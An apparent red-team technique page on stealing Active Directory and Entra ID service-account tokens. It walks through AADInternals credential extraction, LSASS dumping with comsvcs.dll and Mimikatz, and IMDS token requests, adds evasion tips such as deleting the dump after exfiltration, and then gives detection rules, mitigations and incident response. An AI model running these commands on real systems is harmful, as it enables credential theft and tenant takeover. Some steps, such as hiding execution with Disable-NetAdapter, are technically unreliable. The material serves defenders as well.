# [REALWORLD-026]: Service Account Token Harvesting

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-026 |
| **MITRE ATT&CK v18.1** | [T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows Server 2016-2025; Azure AD Connect 1.0+ |
| **Patched In** | Mitigations available; no full patch (design feature) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Service accounts in Active Directory and Entra ID (Azure AD) are high-value targets for token theft. When a service account's refresh token (PRT - Primary Refresh Token) or access token is stolen, attackers can impersonate the service and perform actions with the same privilege level. Service Account Token Harvesting targets tokens stored in memory, cached on disk, or transmitted over unencrypted channels. AAD Connect service accounts are particularly valuable as they hold synchronization privileges between on-premises AD and Entra ID. Tokens can be extracted from process memory (LSASS), DPAPI-encrypted storage locations, or interception during token refresh.

**Attack Surface:** Memory (LSASS process), registry (credential manager), Azure Instance Metadata Service (IMDS), Entra ID cloud token endpoints, and AAD Connect synchronization service.

**Business Impact:** **Full Tenant Compromise.** A stolen service account token with Hybrid Identity Administrator or Global Admin roles allows attackers to modify Entra ID configuration, create backdoor accounts, grant themselves permissions, and maintain persistent access across on-premises and cloud environments. This can lead to ransomware deployment, data exfiltration, and complete organizational compromise.

**Technical Context:** Token harvesting takes minutes once access is gained to the service account process. Detection likelihood is medium if cloud token telemetry is monitored. Tokens can have a lifetime of 1 hour (access token) or months (refresh token), providing persistent backdoor access.

### Operational Risk

- **Execution Risk:** High (Requires SYSTEM or local admin; memory dumping may crash LSASS if not done carefully)
- **Stealth:** Medium (Memory dumps generate crash dumps if not cleaned; token usage from unusual IPs triggers alerts)
- **Reversibility:** No (Stolen tokens cannot be revoked if attacker maintains offline access)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure Foundations Benchmark 1.2.1 | Ensure Global Admins are limited to <3 users |
| **DISA STIG** | ECPG-1 | Privileged account management and monitoring |
| **NIST 800-53** | AC-6 (Least Privilege) | Limit service account permissions to least privilege necessary |
| **GDPR** | Article 32 | Security of processing; encryption and access control |
| **DORA** | Article 9 | Incident reporting and security controls |
| **NIS2** | Article 21 | Cyber Risk Management; credential management |
| **ISO 27001** | A.9.4.4 (Access Management) | Service account management and monitoring |
| **ISO 27005** | Risk Scenario: "Credential Theft from Service Accounts" | Compromise of service accounts enabling full environment access |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** SYSTEM, Local Administrator, or membership in high-privilege groups (Backup Operators for LSASS dumps)
- **Required Access:** Local system access or network access to the service account process
- **Supported Versions:**
  - **Windows:** Server 2016, 2019, 2022, 2025
  - **Entra ID:** All versions (Azure AD Connect 1.0+)
  - **PowerShell:** Version 5.0+
  - **Other Requirements:** AAD Connect installed (for sync service account tokens); cloud connectivity enabled

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Identify Service Accounts in Entra ID

**Objective:** Locate high-privilege service accounts that hold sensitive tokens.

**Command:**

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "ServicePrincipal.Read.All"

# Get service principals with high-privilege roles
Get-MgServicePrincipal -Filter "appOwnerOrganizationId ne null" | `
    Where-Object {$_.ServicePrincipalType -eq "Application"} | `
    Select-Object DisplayName, Id, AppId, ServicePrincipalType
```

**What to Look For:**

- Service accounts with names like `Sync_*`, `AADConnect*`, or custom service account names
- Service principals with roles assigned (Hybrid Identity Administrator, Global Admin)
- Last sign-in dates to identify active vs dormant accounts
- Service accounts with certificate-based authentication (less detectable token theft)

**Version Note:** Command syntax is consistent across Server 2016-2025.

#### Check for AAD Connect Service Accounts

**Objective:** Identify the Azure AD Connect service account and its privilege level.

**Command:**

```powershell
# Query Entra ID for the AAD Connect sync account
Get-MgDirectoryOnPremiseSynchronization | `
    Select-Object Id, Name, SoftMatchEnabled, BlockCloudObjectTakeoverThroughHardMatchEnabled

# Get the AAD Connect service account's role assignments
Get-MgServicePrincipal -Filter "displayName eq 'Microsoft.Azure.SyncFabric'" | `
    Get-MgServicePrincipalAppRoleAssignment
```

**What to Look For:**

- Entra ID display name: "On-Premises Directory Synchronization Service Account"
- Role assignments: "Directory Synchronization Accounts" role (contains sync privileges)
- Refresh token presence (indicates cloud connectivity)
- Certificate details (if using certificate-based auth)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Extract AAD Connect Service Account Tokens via DPAPI Decryption

**Supported Versions:** Server 2016-2025 (All AAD Connect versions)

#### Step 1: Gain Local Admin Access to AAD Connect Server

**Objective:** Establish SYSTEM-level access on the AAD Connect server (usually this is the prerequisite).

**Precondition:** Must already have admin access to the AAD Connect server or have compromised it via initial access.

**What This Enables:** Access to DPAPI-encrypted credentials stored by AAD Connect.

#### Step 2: Extract AAD Connect Encryption Keys via AADInternals

**Objective:** Retrieve the DPAPI master key used to encrypt AAD Connect credentials.

**Command (PowerShell, as Administrator):**

```powershell
# Import AADInternals module
Import-Module AADInternals

# Extract AAD Connect service credentials (requires local admin on AAD Connect server)
Get-AADIntSyncCredentials
```

**Expected Output:**

```
ADConnectorAccountName       : DOMAIN\AAD_ConnectServiceAccount
ADConnectorAccountDomain     : DOMAIN
ADConnectorAccountPassword   : ***(encrypted DPAPI value)***
EntraIdConnectorAccountName  : Sync_SRV-AADCONNECT_###@organization.onmicrosoft.com
EntraIdConnectorAccountType  : User
EntraIdConnectorAccountAuth  : Certificate
```

**What This Means:**

- The AAD Connect service account name is displayed (DOMAIN\AAD_ConnectServiceAccount)
- Entra ID connector account shows cloud service account (Sync_* format)
- Certificate-based authentication indicates modern AAD Connect (v2.0+)
- DPAPI decryption successful; credentials are extracted

**OpSec & Evasion:**

- AADInternals PowerShell module import may trigger EDR alerts
- Encoded base64 import: `[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('...'))`
- Disable-NetAdapter or RunAs to hide execution context
- Detection likelihood: High (AADInternals is detected by most SIEM solutions)

**Troubleshooting:**

- **Error:** "Module not found"
  - **Cause:** AADInternals not installed
  - **Fix:** `Install-Module AADInternals -Force` (requires internet access)

- **Error:** "Access Denied"
  - **Cause:** Not running as SYSTEM or Local Admin
  - **Fix:** Use `runas /user:SYSTEM cmd` or execute via SYSTEM service

#### Step 3: Extract Refresh Token from Entra ID

**Objective:** Use the decrypted credentials to request a new refresh token from Entra ID.

**Command (PowerShell):**

```powershell
# Use the extracted service account credentials to get a token
$ServiceAccountCredentials = New-Object System.Management.Automation.PSCredential(
    "Sync_SRV-AADCONNECT_###@organization.onmicrosoft.com",
    (ConvertTo-SecureString "PASSWORD" -AsPlainText -Force)
)

# Request a refresh token (valid for months)
Connect-MgGraph -TenantId "organization.onmicrosoft.com" -ClientSecretCredential $ServiceAccountCredentials -ErrorAction SilentlyContinue

# Get the current token
$Token = (Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/me").AccessToken
```

**Expected Output:**

```
(Access token returned; valid for 1 hour)
(Refresh token stored in credential cache; valid for 90 days or longer)
```

**What This Means:**

- A valid access token has been acquired with the service account's permissions
- Refresh token is cached locally and can be used to request new tokens without re-authentication
- Attacker can now make API calls as the service account

---

### METHOD 2: Extract Tokens from Service Account Process Memory (Mimikatz)

**Supported Versions:** Server 2016-2025

#### Step 1: Dump LSASS Memory

**Objective:** Capture the LSASS process memory containing cached tokens and credentials.

**Command (PowerShell, as Administrator):**

```powershell
# Use comsvcs.dll to dump LSASS without creating obvious crash dump
$ProcessId = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $ProcessId C:\Temp\lsass.dmp full
```

**Expected Output:**

```
(No output; file is created silently)
```

**Command (Verify Dump):**

```powershell
Get-Item C:\Temp\lsass.dmp -ErrorAction SilentlyContinue | Measure-Object -Property Length
```

**Expected Output:**

```
Count    : 1
Average  : 600000000  (approximately 600 MB for LSASS dump)
```

**What This Means:**

- LSASS memory has been successfully dumped to `C:\Temp\lsass.dmp`
- Dump contains all cached credentials, tokens, and Kerberos tickets
- Dump is in minidump format (can be analyzed offline)

**OpSec & Evasion:**

- Using `comsvcs.dll` avoids creating obvious task manager crash dump dialog
- Move dump file to USB or remote share immediately
- Clear the `C:\Temp\lsass.dmp` file after exfiltration
- Detection likelihood: Medium (LSASS dumps trigger Defender alerts on some systems)

#### Step 2: Extract Tokens from Dump (Offline Analysis)

**Objective:** Analyze the LSASS dump to extract service account tokens.

**Command (Run on analysis machine with Mimikatz):**

```cmd
# Load Mimikatz
mimikatz.exe

# In Mimikatz console:
sekurlsa::minidump C:\Path\to\lsass.dmp
sekurlsa::ekeys
sekurlsa::logonpasswords  # This extracts all cached credentials
```

**Expected Output:**

```
Authentication Id : 0 ; 1234567 (123456)
Session           : Interactive from 1
User Name         : AAD_SyncServiceAccount
Domain            : DOMAIN
Logon Server      : DC-01
Logon Time        : 1/10/2025 9:00:00 AM
SID               : S-1-5-21-...
msv :
        [00000003] Primary
        LM   : **empty**
        NTLM : a1b2c3d4e5f6... (NTLM hash)
```

**What This Means:**

- Service account NTLM hash extracted
- Kerberos ticket information available for Pass-the-Ticket attacks
- Cloud access tokens may be present if service was recently authenticated to Entra ID

---

### METHOD 3: Extract Tokens from Azure Instance Metadata Service (IMDS)

**Supported Versions:** Server 2016+ (if running on Azure VM)

#### Step 1: Query IMDS for Service Account Token (If Running on Azure VM)

**Objective:** Request an access token from Azure's Instance Metadata Service using the managed identity assigned to the VM.

**Command (PowerShell):**

```powershell
# Query IMDS endpoint for access token
$Token = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-12-01&resource=https://graph.microsoft.com/" `
    -Headers @{Metadata="true"} `
    -Method GET

# Display token details
$Token | Select-Object access_token, token_type, expires_in

# Decode the JWT token to see the claims
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(($Token.access_token.Split('.')[1] + '==')))) | ConvertFrom-Json
```

**Expected Output:**

```
access_token : eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkhVU...
token_type   : Bearer
expires_in   : 3599
```

**Decoded Claims:**

```json
{
  "aud": "https://graph.microsoft.com",
  "iss": "https://sts.windows.net/organization-id/",
  "iat": 1736491234,
  "nbf": 1736491234,
  "exp": 1736494834,
  "app_id": "abc123def456...",
  "appidacr": "2",
  "idp": "https://sts.windows.net/organization-id/",
  "oid": "service-account-object-id",
  "rh": "...",
  "sub": "service-account-oid",
  "tid": "organization-tenant-id",
  "unique_name": "managed-identity@azure",
  "uti": "..."
}
```

**What This Means:**

- A valid access token has been extracted from IMDS
- Token is valid for ~1 hour
- Token grants access to Azure services based on assigned managed identity role
- Attacker can use token to access Azure resources, create VMs, access storage, etc.

**OpSec & Evasion:**

- IMDS queries are invisible to most network monitoring (local loopback interface)
- However, Azure Monitor and Defender for Cloud may detect unusual Azure API activity
- Detection likelihood: Low (no local logging; detected only via cloud telemetry)

---

## 6. SPLUNK DETECTION RULES

### Rule 1: AADInternals Module Load Detection

**Rule Configuration:**

- **Required Index:** `main`
- **Required Sourcetype:** `powershell`
- **Required Fields:** `CommandLine`, `ParentImage`
- **Alert Threshold:** Any detection
- **Applies To Versions:** Server 2016-2025

**SPL Query:**

```spl
index=main sourcetype=powershell
(CommandLine="*AADInternals*" OR CommandLine="*Get-AADIntSyncCredentials*")
| stats count by host, User, CommandLine
| where count > 0
```

**What This Detects:**

- PowerShell execution of AADInternals module
- Specific use of Get-AADIntSyncCredentials cmdlet
- Aggregates by host and user to identify lateral movement patterns

**Manual Configuration Steps:**

1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **+ New Alert**
4. Paste the SPL query
5. Set **Trigger Condition** to: `count > 0`
6. Configure **Action** → **Send Email**
7. Click **Save**

---

### Rule 2: LSASS Memory Dump Detection

**Rule Configuration:**

- **Required Index:** `main`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventID`, `CommandLine`
- **Alert Threshold:** Any detection
- **Applies To Versions:** Server 2016-2025

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:Security" EventID=4688
(CommandLine="*comsvcs.dll*MiniDump*" OR CommandLine="*procdump*lsass*" OR CommandLine="*rundll32*")
| stats count by host, User, CommandLine
```

**What This Detects:**

- Process creation events involving LSASS dumping utilities
- comsvcs.dll MiniDump technique
- procdump.exe usage for LSASS dumps

**Source:** [Microsoft Event ID 4688](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688)

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: AAD Connect Service Account Token Usage from Unusual Location

**Rule Configuration:**

- **Required Table:** `SigninLogs`
- **Required Fields:** `UserPrincipalName`, `Location`, `ClientAppUsed`
- **Alert Severity:** Critical
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** All Azure AD versions

**KQL Query:**

```kusto
SigninLogs
| where UserPrincipalName startswith "Sync_" or UserPrincipalName contains "AADConnect"
| where ConditionalAccessStatus != "notApplied"
| where Location != "Known Location"  // Customize known locations
| project TimeGenerated, UserPrincipalName, IPAddress, Location, ClientAppUsed, ResultDescription
| summarize FailureCount=count() by UserPrincipalName, IPAddress
| where FailureCount > 5
```

**What This Detects:**

- Sign-in attempts from sync service accounts from unusual locations
- Failed sign-in attempts that may indicate token reuse
- Multiple failures from the same IP (possible brute-force or token replay)

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `AAD Connect Service Account Suspicious Sign-in`
   - Severity: `Critical`
5. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `10 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create** → **Create**

**Source:** [Microsoft Sentinel SigninLogs](https://learn.microsoft.com/en-us/azure/sentinel/data-connectors/azure-active-directory)

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation)**

- **Log Source:** Security
- **Trigger:** Process creation with `comsvcs.dll`, `procdump`, or `rundll32` targeting LSASS
- **Filter:** `CommandLine contains "MiniDump" OR CommandLine contains "procdump"`
- **Applies To Versions:** Server 2016+

**Event ID: 4648 (Logon with Explicit Credentials)**

- **Log Source:** Security
- **Trigger:** Logon using service account credentials from unusual process
- **Filter:** `TargetUserName contains "Sync_" OR TargetUserName contains "AADConnect"`
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**

1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy**
3. Enable:
   - **Audit Process Creation**: Success and Failure
   - **Audit Logon with Explicit Credentials**: Success and Failure
4. Run `gpupdate /force`

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Sysmon Config Snippet:**

```xml
<!-- Detect LSASS dumping via comsvcs.dll or procdump -->
<RuleGroup name="Process Creation" groupRelation="or">
    <ProcessCreate onmatch="include">
        <CommandLine condition="contains">comsvcs.dll</CommandLine>
        <CommandLine condition="contains">MiniDump</CommandLine>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
        <CommandLine condition="contains">procdump</CommandLine>
        <CommandLine condition="contains">lsass</CommandLine>
    </ProcessCreate>
</RuleGroup>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create `sysmon-config.xml` with the XML above
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Verify: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10`

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Enforce Just-In-Time (JIT) Access for Service Accounts:** Require approval and MFA for any service account access to sensitive systems.

    **Manual Steps (Azure PIM):**
    1. Navigate to **Azure Portal** → **Entra ID** → **Privileged Identity Management**
    2. Click **Azure AD roles** → **Roles**
    3. Select **Hybrid Identity Administrator** role
    4. Click **Settings** → **Edit**
    5. Enable:
       - **Require MFA on activation**
       - **Require Azure AD Multi-Factor Authentication**
       - **Require justification on activation**
    6. Set **Max activation duration** to **4 hours**
    7. Click **Update**

*   **Rotate Service Account Credentials Regularly:** Change service account passwords and certificates quarterly.

    **Manual Steps (AAD Connect):**
    1. Open **AAD Connect** on the sync server
    2. Click **Configure** → **Manage Service Account**
    3. Click **Change** → Provide new password
    4. Click **Next** → **Configure**
    5. Verify synchronization completes successfully
    6. Update password in any scripts or external systems using the service account

    **Manual Steps (Entera ID):**
    1. **Azure Portal** → **Entra ID** → **App registrations**
    2. Search for **Sync_*** service principal
    3. Click **Certificates & secrets** → **New client secret**
    4. Set **Expires**: **90 days**
    5. Copy the secret and update applications
    6. Delete the old secret

*   **Enable Conditional Access Policies for Service Accounts:** Require specific sign-in conditions for service accounts.

    **Manual Steps (Conditional Access):**
    1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Service Account Access Policy`
    4. **Assignments:**
       - Users: **Select users** → Choose service accounts (Sync_*)
       - Cloud apps: **All cloud apps**
    5. **Conditions:**
       - Locations: **Any location** (restrict if applicable)
       - Sign-in risk: **High**
    6. **Access controls:**
       - Grant: **Require device to be marked as compliant**
       - Require MFA
    7. Enable policy: **On**
    8. Click **Create**

### Priority 2: HIGH

*   **Implement Token Lifetime Policies:** Reduce refresh token lifetime to minimize the window of exposure.

    **Manual Steps (PowerShell):**
    ```powershell
    # Create a token lifetime policy
    New-AzureADPolicy -Definition @('{"TokenLifetimePolicy":{"Version":1,"AccessTokenLifetime":"01:00:00","RefreshTokenLifetime":"90.00:00:00","MaxInactiveTime":"14.00:00:00"}}') `
        -DisplayName "Strict Token Policy" `
        -IsOrganizationDefault $true
    ```

*   **Enable Azure AD Audit Logs:** Monitor service account token usage and Entra ID configuration changes.

    **Manual Steps (Audit Log Retention):**
    1. **Azure Portal** → **Entra ID** → **Audit logs**
    2. Ensure retention is set to **30 days minimum**
    3. Configure log export to **Azure Storage** or **Log Analytics** for long-term retention
    4. Set up alerts for:
       - Service principal credential changes
       - Role assignments to service accounts
       - Entra ID configuration changes

### Priority 3: MEDIUM

*   **Restrict Service Account Admin Privileges:** Limit service account roles to least privilege.

    **Manual Steps (RBAC):**
    1. **Azure Portal** → **Entra ID** → **Roles and administrators**
    2. Search for service account (Sync_*)
    3. Review assigned roles
    4. Remove unnecessary roles (e.g., Global Admin, if only Hybrid Identity Admin needed)
    5. Verify AAD Connect functionality still works

    **Manual Steps (Entera ID Roles):**
    ```powershell
    # Remove unnecessary roles from service principal
    $ServicePrincipal = Get-MgServicePrincipal -Filter "displayName eq 'Sync_*'"
    $ServicePrincipal | Get-MgServicePrincipalAppRoleAssignment | Remove-MgServicePrincipalAppRoleAssignment
    ```

### Validation Command (Verify Fix)

```powershell
# Check service account roles
Get-MgServicePrincipal -Filter "displayName eq 'Sync_*'" | Get-MgServicePrincipalAppRoleAssignment

# Check Conditional Access policies targeting service accounts
Get-AzureADPolicy -Filter "isOrganizationDefault eq false" | Where-Object {$_.DisplayName -like "*Service*"}

# Verify token lifetime policy
Get-AzureADPolicy -Filter "type eq 'TokenLifetimePolicy'" | Select-Object -ExpandProperty Definition
```

**Expected Output (If Secure):**

- Service account has only **Hybrid Identity Administrator** role
- Conditional Access policy enforces MFA and device compliance
- Token lifetime policy shows access token ≤ 1 hour, refresh token ≤ 90 days

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Command Artifacts:**
    - `AADInternals` module import or use
    - `Get-AADIntSyncCredentials` PowerShell cmdlet
    - `comsvcs.dll MiniDump` process creation
    - `procdump.exe lsass.exe` execution

*   **File Artifacts:**
    - `lsass.dmp`, `lsass.mdmp`, or similar dump files in `C:\Temp\`, `C:\Windows\Temp\`, or `%USERPROFILE%\AppData\Local\Temp\`
    - AADInternals PowerShell module cache files

*   **Cloud Indicators:**
    - Sign-in events from service accounts (Sync_*) from unusual IPs or locations
    - AAD Connect service account making unusual API calls
    - Service principal token refresh from non-standard locations

### Forensic Artifacts

*   **Disk:**
    - Security Event Log: `C:\Windows\System32\winevt\Logs\Security.evtx` (EventID 4688, 4648)
    - LSASS dump files: `C:\Temp\*.dmp`
    - AADInternals module cache: `$env:APPDATA\PowerShell\PSReadLine\ConsoleHost_history.txt`

*   **Memory:**
    - LSASS process memory contains cached tokens and credentials

*   **Cloud:**
    - Entra ID Sign-in Logs: `https://portal.azure.com` → Entra ID → Sign-in logs
    - Audit Logs: Entra ID configuration changes, service principal modifications
    - Azure Activity Log: API calls made by compromised service account

### Response Procedures

1.  **Isolate:**
    **Command (Disable Service Account Immediately):**
    ```powershell
    # Disable AAD Connect sync account in Entra ID
    Update-MgUser -UserId "sync_serverid@organization.onmicrosoft.com" -AccountEnabled:$false

    # Revoke all refresh tokens for the service account
    Revoke-AzureADUserAllRefreshToken -ObjectId (Get-MgUser -Filter "userPrincipalName eq 'sync_*'").Id
    ```

    **Manual:**
    - Open **Azure Portal** → **Entera ID** → **Users**
    - Find sync service account (Sync_*)
    - Click **Sign-in sessions** → **Revoke all sessions**

2.  **Collect Evidence:**
    **Command:**
    ```powershell
    # Export Entera ID sign-in logs for service account
    Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
        -ResultSize 5000 -UserIds "sync_*" | Export-Csv -Path "C:\Evidence\AADConnect_SignInLog.csv"

    # Export security event log
    wevtutil epl Security C:\Evidence\Security.evtx
    ```

3.  **Remediate:**
    **Command:**
    ```powershell
    # Reset service account password
    Set-MgUserPassword -UserId "sync_*@organization.onmicrosoft.com" -NewPassword (New-Guid).ToString()

    # Rotate AAD Connect service account certificate
    # (Requires restart of AAD Connect service)
    Restart-Service -Name "ADSync" -Force
    ```

4.  **Investigate:**
    - Review Entra ID audit logs for changes made by the compromised service account
    - Check for privilege escalation (role assignments, app permissions)
    - Verify no backdoor accounts were created
    - Scan all user accounts for suspicious password changes or MFA bypasses

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-002] BDC Deserialization Vulnerability | Attacker exploits service vulnerability on AAD Connect server |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare | Attacker escalates to SYSTEM on AAD Connect server |
| **3** | **Credential Access - Current Step** | **[REALWORLD-026] Service Account Token Harvesting** | **Attacker extracts AAD Connect service account token from memory** |
| **4** | **Lateral Movement** | [LM-AUTH-019] AAD Connect Server to AD Movement | Attacker uses service account to move back to on-premises AD |
| **5** | **Persistence** | [REALWORLD-032] Golden SAML Token Creation | Attacker creates persistent tokens for long-term access |
| **6** | **Impact** | [REALWORLD-041] Tenant-Wide Admin Compromise | Attacker modifies Entra ID to create backdoor global admins |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: HAFNIUM (APT Group)

- **Target:** Exchange Server, Microsoft cloud customers
- **Timeline:** 2020-2021
- **Technique Status:** HAFNIUM targeted Azure AD Connect servers during the Exchange Server exploitation campaign to harvest service account tokens for lateral movement
- **Impact:** Compromise of thousands of Exchange Server instances; lateral movement to Azure AD
- **Reference:** [Microsoft Security Advisory on HAFNIUM](https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)

### Example 2: APT29 (Cozy Bear) - SolarWinds Compromise

- **Target:** US Government, NATO allies
- **Timeline:** 2020-2021
- **Technique Status:** APT29 extracted tokens from compromised systems to access Entra ID and on-premises AD
- **Impact:** Full compromise of multiple federal agencies
- **Reference:** [CISA on APT29/SolarWinds](https://www.cisa.gov/news-events/alerts/2020/12/13/alert-aa20-352a-advanced-persistent-threat-compromise-federal-networks)

---
